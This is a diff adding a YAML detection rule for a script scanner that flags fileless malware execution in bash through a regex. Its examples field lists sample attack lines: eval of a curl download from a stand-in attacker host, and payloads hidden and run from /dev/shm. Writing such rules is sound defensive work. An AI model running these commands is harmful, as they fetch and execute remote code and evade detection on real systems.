@@ -1,0 +1,35 @@
+# Bash Pattern: Memory-Only Execution (Fileless)
+# Detects fileless malware execution techniques
+
+id: BASH-025
+name: Memory-Only Execution
+description: |
+  Detects fileless malware execution techniques including direct eval of
+  downloaded content, use of /dev/shm (RAM disk), and other memory-only
+  execution methods. Attackers use these techniques to avoid leaving traces
+  on disk and evade file-based detection systems.
+languages:
+  - bash
+detection_type: regex
+detection_logic: 'eval\s+["\x27]?\$\(curl|eval\s+["\x27]?\$\(wget|/dev/shm/|memfd_create|exec\s+<\s*<\(curl|exec\s+<\s*<\(wget'
+severity: Critical
+mitre_technique: T1620
+confidence: 0.95
+category: execution
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-19"
+  updated: "2025-11-19"
+  references:
+    - "https://attack.mitre.org/techniques/T1620/"
+    - "https://attack.mitre.org/techniques/T1059/004/"
+  tags:
+    - bash
+    - fileless
+    - memory-execution
+    - evasion
+  examples:
+    - 'eval "$(curl -s http://attacker.com/payload.sh)"'
+    - "echo $payload > /dev/shm/.hidden"
+    - "/dev/shm/.malware"
